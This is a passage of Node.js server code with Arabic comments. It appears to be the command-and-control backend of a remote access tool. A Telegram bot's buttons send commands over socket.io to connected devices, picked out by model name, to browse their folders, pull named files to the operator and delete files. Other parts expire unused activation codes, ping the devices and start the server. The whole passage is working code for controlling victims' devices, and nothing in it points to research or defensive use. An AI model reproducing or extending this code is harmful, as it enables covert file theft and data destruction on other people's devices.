    return bot.answerCallbackQuery(query.id, { text: TEXT.NOT_AUTH_CB });
  }

  const [device, action] = query.data.split("|");
  const [cmd, param]     = action.split("-");

  const emitToDevice = (request, extras = []) => {
    io.sockets.sockets.forEach((s, id) => {
      if (s.model === device) io.to(id).emit("file-explorer", { request, extras });
    });
  };

  if (cmd === "back")   emitToDevice("back");
  if (cmd === "cd")     emitToDevice("cd",   [{ key: "name", value: param }]);
  if (cmd === "upload") emitToDevice("upload",[{ key: "name", value: param }]);
  if (cmd === "delete") emitToDevice("delete",[{ key: "name", value: param }]);

  if (cmd === "request") {
    bot.editMessageText(fill(TEXT.FILE_ACTION, { name: param }), {
      chat_id: USER_ID,
      message_id: query.message.message_id,
      reply_markup: {
        inline_keyboard: [[
          { text: "📥 تحميل", callback_data: device + "|upload-" + param },
          { text: "🗑 حذف", callback_data: device + "|delete-" + param }
        ]]
      },
      parse_mode: "HTML"
    });
  }
});

// ═══════════════════════════════════════════════════════
//   🧹 تنظيف دوري
// ═══════════════════════════════════════════════════════
setInterval(() => {
  const now = Date.now();
  let changed = false;
  Object.keys(activeCodes).forEach(code => {
    if (now > activeCodes[code].expiresAt && !activeCodes[code].usedBy) {
      delete activeCodes[code];
      changed = true;
    }
  });
  if (changed) saveCodes();
}, CONFIG.CLEANUP_INTERVAL);

// ═══════════════════════════════════════════════════════
//   💓 Ping Keep-Alive
// ═══════════════════════════════════════════════════════
setInterval(() => {
  io.sockets.sockets.forEach((_s, id) => io.to(id).emit("ping", {}));
}, CONFIG.PING_INTERVAL);

// ═══════════════════════════════════════════════════════
//   🚀 تشغيل السيرفر
// ═══════════════════════════════════════════════════════
server.listen(CONFIG.PORT, () => {
  console.log("⚡ ═══ [ SERVER ONLINE ON PORT " + CONFIG.PORT + " ] ═══ ⚡");
});